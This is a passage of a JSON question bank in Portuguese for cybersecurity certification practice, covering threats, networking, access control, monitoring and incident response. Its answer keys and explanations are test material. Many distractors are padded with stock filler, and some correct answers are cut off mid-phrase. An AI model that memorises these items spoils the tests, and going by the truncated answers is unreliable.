    "options": [
      "Melhorar o desempenho do sistema segundo a prática comum",
      "Esconder a sua presença e manter acesso privilegiado num sistema",
      "Fazer cópias dos ficheiros do utilizador durante janelas de manutenção de rotina",
      "Atualizar firmware com segurança em redes empresariais típicas"
    ],
    "correct": 1,
    "explanation": "Um rootkit esconde malware e mantém acesso privilegiado furtivo, muitas vezes subvertendo o SO para que as ferramentas normais não o vejam.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "ameacas",
    "domain": "1.2"
  },
  {
    "question": "Porque é que as gamas de IP privado (como 10.0.0.0/8) não são encaminháveis na Internet pública?",
    "options": [
      "Estão reservadas para uso interno e são descartadas pelos routers da Internet",
      "São mais rápidas que os IP públicos durante janelas de manutenção de rotina",
      "São só para IPv6 em redes empresariais típicas segundo a prática comum",
      "São cifradas por conceção no dia a dia das operações quando não existem outros controlos"
    ],
    "correct": 0,
    "explanation": "As gamas privadas da RFC 1918 estão reservadas para redes internas e não são encaminhadas na Internet pública, razão pela qual se usa NAT.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "rede-cloud",
    "domain": "2.2"
  },
  {
    "question": "O que são TTPs na análise de ameaças?",
    "options": [
      "Táticas, Técnicas e Procedimentos de um adversário",
      "Protocolos de Tabela de Transporte",
      "Portas de Terminal de Confiança",
      "Passwords de Teste Temporárias segundo a prática comum"
    ],
    "correct": 0,
    "explanation": "Os TTPs descrevem como um adversário opera: as suas táticas (objetivos), técnicas (métodos) e procedimentos (implementações específicas).",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "logs-ir",
    "domain": "5.2"
  },
  {
    "question": "Porque deve a documentação de incidente ser atualizada e partilhada com segurança durante a resposta?",
    "options": [
      "Para atrasar a investigação em redes empresariais típicas",
      "Para manter os respondentes coordenados e preservar um registo rigoroso",
      "Para expor as provas publicamente sem ferramentas adicionais",
      "Para apagar todas as notas anteriores durante janelas de manutenção de rotina"
    ],
    "correct": 1,
    "explanation": "Manter a documentação atual e partilhada com segurança mantém a equipa coordenada e preserva um registo rigoroso e admissível do incidente.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "risco",
    "domain": "4.2"
  },
  {
    "question": "O que impõem sobretudo as permissões de ficheiros e diretórios?",
    "options": [
      "Que utilizadores ou processos podem ler",
      "A taxa de atualização do ecrã",
      "A ordem dos dispositivos de arranque",
      "A largura do canal Wi-Fi em parques de vários fabricantes"
    ],
    "correct": 0,
    "explanation": "As permissões impõem controlo de acesso ao nível do sistema de ficheiros, decidindo que utilizadores/processos podem ler, escrever ou executar cada recurso.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "endpoint",
    "domain": "3.1"
  },
  {
    "question": "O que acrescenta a virtualização ao planeamento de segurança num centro de dados?",
    "options": [
      "Elimina a necessidade de atualizações",
      "Várias VMs isoladas partilham hardware",
      "Torna todos os servidores físicos de novo",
      "Desativa os registos por omissão na maioria dos ambientes de produção"
    ],
    "correct": 1,
    "explanation": "A virtualização consolida muitas VMs isoladas em hardware partilhado, por isso o isolamento das VMs, o hardening do hipervisor e os snapshots passam a ser preocupações de segurança.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "rede-cloud",
    "domain": "2.3"
  },
  {
    "question": "Qual é o traço central que torna a engenharia social eficaz?",
    "options": [
      "Explora a confiança e o comportamento humano em vez de apenas falhas técnicas",
      "Só funciona contra hardware antigo em parques de vários fabricantes durante janelas de manutenção de rotina",
      "Exige acesso físico de cada vez quando não existem outros controlos",
      "Precisa da chave privada da vítima em parques de vários fabricantes"
    ],
    "correct": 0,
    "explanation": "A engenharia social manipula as pessoas (confiança, urgência, autoridade) para contornar controlos técnicos, por isso a formação de sensibilização importa.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "ameacas",
    "domain": "1.2"
  },
  {
    "question": "Qual é o papel de uma Autoridade de Certificação (CA) na PKI?",
    "options": [
      "Guarda as passwords dos utilizadores",
      "Emite e atesta a autenticidade dos certificados digitais",
      "Cifra o disco rígido sem ferramentas adicionais",
      "Atribui endereços IP durante janelas de manutenção de rotina"
    ],
    "correct": 1,
    "explanation": "Uma CA é um terceiro de confiança que emite e assina certificados, atestando que uma chave pública pertence à identidade indicada.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "cripto",
    "domain": "1.4"
  },
  {
    "question": "Como se relacionam ameaça, vulnerabilidade e exploit?",
    "options": [
      "Uma ameaça é uma fraqueza; um exploit é um desastre natural quando não existem outros controlos",
      "Uma ameaça pode usar um exploit contra uma vulnerabilidade para causar dano",
      "São três nomes para a mesma coisa sem ferramentas adicionais",
      "Um exploit corrige sempre uma vulnerabilidade no dia a dia das operações"
    ],
    "correct": 1,
    "explanation": "Uma ameaça é uma causa potencial de dano; uma vulnerabilidade é uma fraqueza; um exploit é o método que usa essa fraqueza.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "risco",
    "domain": "1.4"
  },
  {
    "question": "No CVSS, o que descreve a métrica Attack Vector?",
    "options": [
      "Até onde o atacante pode estar para explorar a vulnerabilidade",
      "O custo do kit de exploração em parques de vários fabricantes",
      "A cor do alerta em redes empresariais típicas na maioria dos ambientes de produção",
      "A idade da correção em redes empresariais típicas"
    ],
    "correct": 0,
    "explanation": "O Attack Vector classifica se a exploração exige alcance físico, local, adjacente ou de rede até ao componente vulnerável.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "risco",
    "domain": "1.7"
  },
  {
    "question": "Que modelo de controlo de acesso atribui permissões com base no papel do sujeito?",
    "options": [
      "DAC",
      "MAC",
      "RBAC",
      "ABAC"
    ],
    "correct": 2,
    "explanation": "O Controlo de Acesso Baseado em Papéis (RBAC) concede direitos segundo os papéis; o DAC é dirigido pelo dono, o MAC por rótulos e o ABAC por atributos.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "risco",
    "domain": "1.6"
  },
  {
    "question": "O que usa o Controlo de Acesso Baseado em Atributos (ABAC) para decidir o acesso?",
    "options": [
      "Apenas uma password partilhada",
      "Atributos do sujeito, objeto, ação e ambiente",
      "Só o endereço MAC em redes empresariais típicas",
      "A cor do cartão no dia a dia das operações"
    ],
    "correct": 1,
    "explanation": "O ABAC avalia atributos do utilizador, recurso, ação e contexto (hora, localização) face a políticas para permitir ou negar.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "risco",
    "domain": "1.6"
  },
  {
    "question": "Qual é a ideia central da defesa em profundidade para um analista de SOC?",
    "options": [
      "Um controlo perfeito basta em redes empresariais típicas",
      "Vários controlos sobrepostos aumentam a chance de deteção e atrasam o atacante",
      "Os registos devem ser desativados para poupar espaço",
      "Todo o tráfego dentro da LAN deve ser de confiança na maioria dos ambientes de produção"
    ],
    "correct": 1,
    "explanation": "A defesa em profundidade significa controlos em camadas para que a deteção e o atraso continuem possíveis mesmo se uma camada falhar.",
    "difficulty": "Fácil",
    "exam": "cbrops",
    "topic": "risco",
    "domain": "1.5"
  },
  {
    "question": "Que cinco campos formam a 5-tupla clássica usada para isolar um host nos registos de rede?",
    "options": [
      "IP de origem, IP de destino, porta de origem, porta de destino, protocolo",
      "Utilizador, password, VLAN, SSID, gateway na maioria dos ambientes de produção",
      "MAC, número de série, modelo, firmware, fabricante",
      "Hash do ficheiro, caminho, tamanho, dono, ACL"
    ],
    "correct": 0,
    "explanation": "A 5-tupla (IP origem, IP destino, porta origem, porta destino, protocolo) identifica de forma única um fluxo e ajuda a isolar um host comprometido nos registos.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "1.10"
  },
  {
    "question": "Como difere a deteção baseada em regras da deteção comportamental?",
    "options": [
      "A baseada em regras corresponde a assinaturas conhecidas",
      "A baseada em regras só funciona offline; a comportamental só online",
      "São abordagens idênticas em redes empresariais típicas",
      "A comportamental nunca gera alertas"
    ],
    "correct": 0,
    "explanation": "A deteção por regras/assinaturas corresponde a padrões conhecidos; a comportamental/estatística assinala anomalias face a uma linha de base de atividade normal.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "1.11"
  },
  {
    "question": "Porque é que a cifra pode dificultar a monitorização de segurança?",
    "options": [
      "Apenas abranda o CPU na maioria dos ambientes de produção quando não existem outros controlos",
      "Os conteúdos cifrados escondem-se de sensores de rede sem capacidade de decifra",
      "Apaga todos os registos segundo a prática comum no dia a dia das operações",
      "Desativa o DHCP segundo a prática comum quando não existem outros controlos"
    ],
    "correct": 1,
    "explanation": "A cifra ponta a ponta esconde o conteúdo dos payloads a NIDS/proxies que não podem decifrar, reduzindo a visibilidade sobre conteúdo malicioso.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "1.8"
  },
  {
    "question": "Como diferem superfície de ataque e vulnerabilidade?",
    "options": [
      "A superfície de ataque é o conjunto de pontos expostos",
      "São sinónimos sem ferramentas adicionais",
      "A superfície de ataque é sempre um erro em parques de vários fabricantes",
      "Uma vulnerabilidade é só o número de portas abertas"
    ],
    "correct": 0,
    "explanation": "A superfície de ataque é o conjunto de pontos de entrada que um adversário pode tentar; uma vulnerabilidade é uma fraqueza concreta que pode existir nesses pontos.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "ameacas",
    "domain": "2.1"
  },
  {
    "question": "Que tipo de dados fornece sobretudo o NetFlow para a monitorização de segurança?",
    "options": [
      "Payloads completos dos pacotes",
      "Metadados de sessão como quem falou com quem",
      "Chaves de cifra de disco segundo a prática comum",
      "O corpo das mensagens de correio"
    ],
    "correct": 1,
    "explanation": "O NetFlow (e dados de fluxo semelhantes) regista metadados de ligação — extremos, portas, bytes, duração — sem guardar os payloads completos.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "2.2"
  },
  {
    "question": "O que dá uma captura completa de pacotes (PCAP) que o NetFlow não dá?",
    "options": [
      "Apenas o endereço MAC de origem",
      "O conteúdo real dos payloads dos pacotes",
      "Apenas o ID da VLAN no dia a dia das operações",
      "Apenas as concessões DHCP"
    ],
    "correct": 1,
    "explanation": "O PCAP guarda os pacotes completos incluindo payloads, permitindo análise profunda do conteúdo que os metadados de fluxo sozinhos não dão.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "2.2"
  },
  {
    "question": "Como difere tipicamente uma firewall de nova geração (NGFW) de uma firewall stateful tradicional?",
    "options": [
      "Uma NGFW acrescenta consciência de aplicação",
      "Uma NGFW nunca acompanha o estado",
      "Uma NGFW só funciona na Camada 1 sem ferramentas adicionais",
      "Não há diferença segundo a prática comum"
    ],
    "correct": 0,
    "explanation": "As NGFW acrescentam identificação de aplicações, filtragem de URL/conteúdo e muitas vezes prevenção de intrusões e inspeção de malware em cima da filtragem stateful.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "firewall-vpn",
    "domain": "2.2"
  },
  {
    "question": "Como pode o NAT/PAT reduzir a visibilidade para um SOC que revê tráfego de entrada?",
    "options": [
      "Ao esconder muitos hosts internos atrás de um endereço público",
      "Ao apagar todos os registos NetFlow sem ferramentas adicionais",
      "Ao cifrar o SIEM no dia a dia das operações",
      "Ao desativar o DNS em redes empresariais típicas"
    ],
    "correct": 0,
    "explanation": "O PAT multiplexa muitos hosts internos atrás de um IP público, pelo que os registos de entrada podem mostrar só o endereço público se não houver correlação com registos internos.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "rede-cloud",
    "domain": "2.3"
  },
  {
    "question": "O que descreve melhor um ataque de rede baseado em protocolo?",
    "options": [
      "Abusar de funcionalidades ou fraquezas de protocolos (por exemplo SYN floods",
      "Apenas phishing por email durante janelas de manutenção de rotina",
      "Apenas o roubo físico de um portátil durante janelas de manutenção de rotina",
      "Apenas quebrar hashes de passwords offline"
    ],
    "correct": 0,
    "explanation": "Os ataques baseados em protocolo usam indevidamente o comportamento dos protocolos (inundações, amplificação, pacotes malformados) para perturbar ou enganar serviços de rede.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "ameacas",
    "domain": "2.5"
  },
  {
    "question": "Qual é o objetivo principal de um ataque de cross-site scripting (XSS)?",
    "options": [
      "Injetar scripts maliciosos numa página web de confiança vista por outros utilizadores",
      "Inundar um servidor DNS de consultas no dia a dia das operações sem ferramentas adicionais",
      "Roubar um módulo de segurança de hardware na maioria dos ambientes de produção",
      "Reescrever rotas BGP na maioria dos ambientes de produção no dia a dia das operações"
    ],
    "correct": 0,
    "explanation": "O XSS injeta script controlado pelo atacante numa página em que o browser das vítimas confia, muitas vezes para roubar sessões ou agir como o utilizador.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "ameacas",
    "domain": "2.6"
  },
  {
    "question": "O que procura tipicamente fazer um ataque de injeção de comandos contra uma aplicação web?",
    "options": [
      "Correr comandos da shell do SO através de entrada não sanitizada",
      "Melhorar o layout da página em parques de vários fabricantes",
      "Rodar certificados TLS no dia a dia das operações durante janelas de manutenção de rotina",
      "Desativar o JavaScript em redes empresariais típicas"
    ],
    "correct": 0,
    "explanation": "A injeção de comandos passa entrada controlada pelo atacante para uma shell ou chamada de sistema, permitindo correr comandos no servidor.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "ameacas",
    "domain": "2.6"
  },
  {
    "question": "Como pode a IA generativa alterar os ataques de engenharia social?",
    "options": [
      "Pode produzir phishing mais convincente e personalizado à escala",
      "Torna a engenharia social impossível em parques de vários fabricantes",
      "Só ajuda os defensores, nunca os atacantes",
      "Elimina a necessidade de qualquer acesso à rede"
    ],
    "correct": 0,
    "explanation": "A IA generativa pode criar phishing fluente e personalizado à escala, e deepfakes, elevando a qualidade dos engodos de engenharia social.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "ameacas",
    "domain": "2.7"
  },
  {
    "question": "Qual é o papel de um canal de comando e controlo (C2) num ataque a um endpoint?",
    "options": [
      "Permite ao atacante dirigir remotamente os hosts comprometidos",
      "É o feed de atualização do antivírus",
      "É a renovação da concessão DHCP em parques de vários fabricantes",
      "É o spooler da impressora no dia a dia das operações"
    ],
    "correct": 0,
    "explanation": "O C2 é o caminho de comunicação usado pelo malware para o atacante emitir comandos e receber dados dos hosts comprometidos.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "ameacas",
    "domain": "2.8"
  },
  {
    "question": "Porque usam os atacantes túneis ou cifra como técnicas de evasão?",
    "options": [
      "Para fazer o tráfego malicioso parecer ou esconder-se dentro de protocolos permitidos",
      "Para acelerar transferências legítimas quando não existem outros controlos durante janelas de manutenção de rotina",
      "Para reduzir o uso de CPU na vítima durante janelas de manutenção de rotina",
      "Para forçar atualizações em redes empresariais típicas no dia a dia das operações"
    ],
    "correct": 0,
    "explanation": "Túneis e cifra escondem C2 ou exfiltração dentro de protocolos permitidos (HTTPS, DNS, SSH), contornando filtros simples.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "ameacas",
    "domain": "2.9"
  },
  {
    "question": "Como afetam os certificados a monitorização de segurança do tráfego HTTPS?",
    "options": [
      "Sem interceção TLS ou telemetria no endpoint",
      "Os certificados apagam todo o NetFlow",
      "Os certificados bloqueiam o ARP em parques de vários fabricantes",
      "Os certificados forçam apenas IPv6"
    ],
    "correct": 0,
    "explanation": "O HTTPS cifra os payloads; sem um ponto de interceção TLS ou telemetria no host, os sensores de rede veem pouco do conteúdo.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "cripto",
    "domain": "2.10"
  },
  {
    "question": "Que componente de um certificado X.509 nomeia a entidade a que pertence?",
    "options": [
      "O campo Subject",
      "O TTL de um registo DNS",
      "O ID da VLAN",
      "O tamanho do MTU"
    ],
    "correct": 0,
    "explanation": "Os campos Subject (e Subject Alternative Name) identificam a entidade para a qual o certificado foi emitido.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "cripto",
    "domain": "2.11"
  },
  {
    "question": "O que monitoriza sobretudo um sistema de deteção de intrusões baseado em host (HIDS)?",
    "options": [
      "A atividade e os ficheiros num único host",
      "Apenas o tráfego entre dois routers",
      "Apenas a faturação na cloud quando não existem outros controlos",
      "Apenas as filas das impressoras"
    ],
    "correct": 0,
    "explanation": "Um HIDS observa a atividade ao nível do host (registos, ficheiros, processos) nessa máquina, complementando o IDS de rede.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "endpoint",
    "domain": "3.1"
  },
  {
    "question": "Na forense digital, o que é prova corroborativa?",
    "options": [
      "Prova que apoia outras provas mas não basta sozinha",
      "A única peça de prova necessária",
      "Prova que contradiz o caso segundo a prática comum",
      "Prova que deve ser apagada sem ferramentas adicionais"
    ],
    "correct": 0,
    "explanation": "A prova corroborativa apoia outras descobertas mas não provaria o caso sozinha; a melhor prova é a fonte primária mais fiável.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "3.4"
  },
  {
    "question": "O que inclui tipicamente o relatório de uma sandbox de malware (câmara de detonação)?",
    "options": [
      "O comportamento observado da amostra quando executada num ambiente controlado",
      "O salário da vítima quando não existem outros controlos sem ferramentas adicionais",
      "A planta do escritório quando não existem outros controlos",
      "A password Wi-Fi do SOC durante janelas de manutenção de rotina"
    ],
    "correct": 0,
    "explanation": "Uma sandbox corre uma amostra em isolamento e reporta o comportamento (ficheiros, rede, registo) para ajudar os analistas a classificá-la em segurança.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "3.6"
  },
  {
    "question": "Na qualidade da deteção, o que é um falso positivo?",
    "options": [
      "Um alerta gerado quando não havia ameaça real",
      "Um ataque detetado corretamente",
      "Um ataque falhado em parques de vários fabricantes",
      "Um início de sessão bem-sucedido"
    ],
    "correct": 0,
    "explanation": "Um falso positivo é um alerta que dispara sem evento malicioso real, desperdiçando tempo do analista; um falso negativo é um ataque real falhado.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "4.2"
  },
  {
    "question": "Como difere a inspeção profunda de pacotes (DPI) da filtragem simples de pacotes?",
    "options": [
      "A DPI examina o conteúdo do payload para além dos cabeçalhos e portas",
      "A DPI só olha para o preâmbulo Ethernet sem ferramentas adicionais",
      "A DPI desativa todos os registos no dia a dia das operações quando não existem outros controlos",
      "A DPI só funciona em UDP na maioria dos ambientes de produção"
    ],
    "correct": 0,
    "explanation": "Os filtros de pacotes usam cabeçalhos/portas; a DPI inspeciona o conteúdo da camada de aplicação para identificar ameaças ou aplicações.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "firewall-vpn",
    "domain": "4.3"
  },
  {
    "question": "Qual é uma diferença-chave entre um IPS em linha e um tap passivo para monitorização?",
    "options": [
      "O IPS em linha pode bloquear tráfego; um tap só observa uma cópia",
      "Um tap pode bloquear tráfego; o IPS em linha não",
      "São funcionalmente idênticos na maioria dos ambientes de produção",
      "Um tap cifra todos os pacotes"
    ],
    "correct": 0,
    "explanation": "Um IPS em linha fica no caminho e pode descartar pacotes; um tap/SPAN só recebe uma cópia e não pode bloquear.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "4.4"
  },
  {
    "question": "Ao analisar um PCAP de uma suspeita de intrusão, que elementos devem ser identificados primeiro?",
    "options": [
      "Endereços de origem e destino",
      "Apenas o nome do ficheiro de captura",
      "Apenas o nome de utilizador do analista",
      "Apenas o brilho do ecrã quando não existem outros controlos"
    ],
    "correct": 0,
    "explanation": "Os elementos-chave de uma intrusão num PCAP são quem falou com quem (IPs), em que portas, que protocolos e como são os payloads.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "4.7"
  },
  {
    "question": "Que artefacto é comummente usado para identificar amostras de malware conhecidas entre sistemas?",
    "options": [
      "Um hash criptográfico do ficheiro (por exemplo SHA-256)",
      "A cor do fundo do ambiente de trabalho",
      "O modelo da impressora durante janelas de manutenção de rotina",
      "O código postal do escritório"
    ],
    "correct": 0,
    "explanation": "Os hashes de ficheiro identificam amostras de forma única para que o mesmo malware seja reconhecido entre hosts e feeds de threat intel.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "4.9"
  },
  {
    "question": "Porque aprendem os analistas de SOC expressões regulares básicas?",
    "options": [
      "Para corresponder e extrair padrões em registos e dados de pacotes de forma eficiente",
      "Para substituir a necessidade de firewalls quando não existem outros controlos",
      "Para atribuir endereços IP em redes empresariais típicas quando não existem outros controlos",
      "Para configurar RAID em parques de vários fabricantes segundo a prática comum"
    ],
    "correct": 0,
    "explanation": "As regex permitem aos analistas filtrar e extrair padrões (IPs, URLs, hashes) rapidamente em grandes conjuntos de registos e PCAPs.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "4.10"
  },
  {
    "question": "O que envolve sobretudo a gestão de vulnerabilidades?",
    "options": [
      "Identificar, priorizar e remediar fraquezas ao longo do tempo",
      "Apenas comprar novas firewalls na maioria dos ambientes de produção",
      "Apenas repor passwords mensalmente em parques de vários fabricantes",
      "Apenas pintar os armários de servidores"
    ],
    "correct": 0,
    "explanation": "A gestão de vulnerabilidades é o processo contínuo de encontrar, classificar e corrigir fraquezas em todo o parque.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "risco",
    "domain": "5.1"
  },
  {
    "question": "Segundo o NIST SP 800-61, que atividade pertence à fase de Preparação?",
    "options": [
      "Construir playbooks, contactos e ferramentas antes de um incidente",
      "Apagar todas as provas após um incidente sem ferramentas adicionais",
      "Ignorar alertas sem ferramentas adicionais",
      "Partilhar passwords num quadro branco em parques de vários fabricantes"
    ],
    "correct": 0,
    "explanation": "A Preparação cobre políticas, playbooks, contactos, ferramentas e formação para a equipa responder eficazmente quando ocorrer um incidente.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "5.2"
  },
  {
    "question": "Segundo a ordem de volatilidade, que prova deve ser capturada antes de uma imagem de disco?",
    "options": [
      "Registos do CPU e conteúdos da RAM",
      "Cópias em fita arquivadas do ano passado",
      "Manuais impressos sem ferramentas adicionais",
      "Cartazes de parede"
    ],
    "correct": 0,
    "explanation": "Os dados voláteis (CPU, RAM, estado de rede) desaparecem ao desligar, por isso são recolhidos antes de armazenamento menos volátil como imagens de disco.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "5.6"
  },
  {
    "question": "Que elemento é usado ao perfilar uma rede para deteção de anomalias?",
    "options": [
      "Débito típico, duração das sessões, portas e espaço de endereços de ativos críticos",
      "A cor dos cabos de patch na maioria dos ambientes de produção",
      "A marca das cadeiras em redes empresariais típicas na maioria dos ambientes de produção",
      "O tipo de letra dos emails no dia a dia das operações"
    ],
    "correct": 0,
    "explanation": "A perfilagem de rede estabelece a linha de base de débito, duração de sessões, portas em uso e gamas críticas para que os desvios se destaquem.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "5.7"
  },
  {
    "question": "Ao perfilar um servidor para segurança, que item é útil para a linha de base?",
    "options": [
      "Portas à escuta, utilizadores ligados, processos em execução e aplicações",
      "A imagem de fundo durante janelas de manutenção de rotina quando não existem outros controlos",
      "Apenas o idioma do teclado na maioria dos ambientes de produção",
      "A altura da secretária quando não existem outros controlos"
    ],
    "correct": 0,
    "explanation": "A perfilagem de servidor regista portas à escuta, contas, processos e apps para que serviços ou utilizadores inesperados fiquem visíveis.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "5.8"
  },
  {
    "question": "Que tipo de dados é informação de saúde protegida (PHI)?",
    "options": [
      "Registos médicos que identificam um paciente",
      "Uma previsão do tempo pública quando não existem outros controlos",
      "Uma licença de software open-source",
      "O comprimento de um cabo de rede"
    ],
    "correct": 0,
    "explanation": "A PHI é informação de saúde que pode identificar uma pessoa e está protegida por referenciais como o HIPAA.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "risco",
    "domain": "5.9"
  },
  {
    "question": "O que medem métricas de SOC como tempo até detetar e tempo até conter?",
    "options": [
      "Quão depressa a equipa encontra e limita um incidente",
      "Quão depressa imprimem as impressoras",
      "Quão brilhantes são as luzes do SOC",
      "Quantas chávenas de café se usam quando não existem outros controlos"
    ],
    "correct": 0,
    "explanation": "Métricas de SOC como TTD/TTC/TTR quantificam a velocidade de resposta para a organização melhorar a deteção e a contenção.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "5.11"
  },
  {
    "question": "Numa consulta DNS suspeita vista num PCAP, que campos são mais úteis de inspecionar?",
    "options": [
      "Nome da consulta, tipo de consulta e endereços da resposta",
      "Apenas o FCS Ethernet no dia a dia das operações na maioria dos ambientes de produção",
      "Apenas o TTL do IP em redes empresariais típicas",
      "Apenas o tamanho da janela TCP sem ferramentas adicionais"
    ],
    "correct": 0,
    "explanation": "A análise de DNS centra-se no nome consultado, no tipo (A/AAAA/TXT/MX) e nas respostas devolvidas, que muitas vezes revelam C2 ou tunneling.",
    "difficulty": "Difícil",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "4.8"
  },
  {
    "question": "O que procura sobretudo alcançar um ataque de buffer overflow num endpoint?",
    "options": [
      "Sobrescrever memória para alterar o fluxo de controlo do programa",
      "Melhorar a segurança da memória",
      "Comprimir o binário durante janelas de manutenção de rotina",
      "Atualizar a BIOS com segurança na maioria dos ambientes de produção"
    ],
    "correct": 0,
    "explanation": "Um buffer overflow escreve para além dos limites de um buffer para corromper memória e muitas vezes sequestrar o fluxo de controlo para execução arbitrária de código.",
    "difficulty": "Difícil",
    "exam": "cbrops",
    "topic": "ameacas",
    "domain": "2.8"
  },
  {
    "question": "O que é a caça a ameaças (threat hunting)?",
    "options": [
      "Procurar proativamente ameaças que as deteções automáticas possam ter falhado",
      "Esperar que os fornecedores enviem indicadores por email em parques de vários fabricantes",
      "Apagar todos os registos semanalmente quando não existem outros controlos",
      "Desativar o EDR para reduzir o ruído em parques de vários fabricantes"
    ],
    "correct": 0,
    "explanation": "A caça a ameaças é uma procura proativa, guiada por hipóteses, de atividade adversária que os alertas existentes possam não ter captado.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "1.3"
  },
  {
    "question": "O que enfatiza o DevSecOps?",
    "options": [
      "Integrar a segurança no pipeline CI/CD em vez de a tratar como um portão final",
      "Remover todos os testes automáticos em parques de vários fabricantes",
      "Publicar sem quaisquer revisões durante janelas de manutenção de rotina",
      "Guardar segredos no código-fonte em parques de vários fabricantes quando não existem outros controlos"
    ],
    "correct": 0,
    "explanation": "O DevSecOps incorpora a segurança nos pipelines de desenvolvimento e entrega (análise, política como código) em vez de a acrescentar no fim.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "risco",
    "domain": "1.3"
  },
  {
    "question": "Um analista vê no registo Security do Windows muitas falhas 4625 seguidas de um 4624 da mesma conta a partir de um IP invulgar. O que sugere mais este padrão?",
    "options": [
      "Possível força bruta que acabou por ter sucesso",
      "Uma desfragmentação de disco bem-sucedida",
      "Uma renovação DHCP normal sem ferramentas adicionais",
      "Uma atualização de firmware da impressora"
    ],
    "correct": 0,
    "explanation": "Falhas de início de sessão repetidas (4625) e depois um sucesso (4624) de uma origem estranha é um sinal clássico de força bruta ou spraying bem-sucedido.",
    "difficulty": "Difícil",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "3.5"
  },
  {
    "question": "O que caracteriza um ataque de negação de serviço distribuída (DDoS)?",
    "options": [
      "Muitas fontes coordenadas sobrecarregam a capacidade do alvo",
      "Um único utilizador erra a password uma vez",
      "Uma análise antivírus agendada sem ferramentas adicionais",
      "Uma janela de atualização de firmware sem ferramentas adicionais"
    ],
    "correct": 0,
    "explanation": "O DDoS usa muitas fontes (muitas vezes uma botnet) para inundar um alvo além da sua capacidade, tornando o serviço indisponível.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "ameacas",
    "domain": "2.5"
  },
  {
    "question": "Que tipo de dados acrescenta tipicamente a Application Visibility and Control (AVC)?",
    "options": [
      "Identificação de aplicações para além dos números de porta",
      "Apenas a intensidade do sinal na Camada 1",
      "Apenas os números de série dos switches",
      "Apenas a temperatura do escritório na maioria dos ambientes de produção"
    ],
    "correct": 0,
    "explanation": "A AVC classifica o tráfego por aplicação (não só por porta), permitindo políticas e monitorização com base nas apps realmente usadas.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "firewall-vpn",
    "domain": "2.2"
  },
  {
    "question": "Um alerta mostra um registo de proxy para um domínio raro, um hit de assinatura IPS no mesmo fluxo e NetFlow com grande volume de saída. O que deve o analista fazer primeiro?",
    "options": [
      "Correlacionar as fontes para confirmar um caso real de exfiltração ou C2",
      "Ignorar os três porque se contradizem em parques de vários fabricantes",
      "Apagar o NetFlow no dia a dia das operações segundo a prática comum",
      "Desativar o proxy na maioria dos ambientes de produção quando não existem outros controlos"
    ],
    "correct": 0,
    "explanation": "Vários sensores independentes a coincidir no mesmo fluxo aumentam a confiança; correlacionar carimbos de tempo, IPs e utilizadores antes da contenção.",
    "difficulty": "Difícil",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "4.1"
  },
  {
    "question": "Que ameaça específica da cloud envolve o roubo de chaves de API que dão acesso amplo a recursos na cloud?",
    "options": [
      "Credenciais comprometidas e APIs inseguras",
      "Corte de cabo no ISP sem ferramentas adicionais",
      "Encravamento de papel na impressora",
      "Falha da luz de fundo do monitor"
    ],
    "correct": 0,
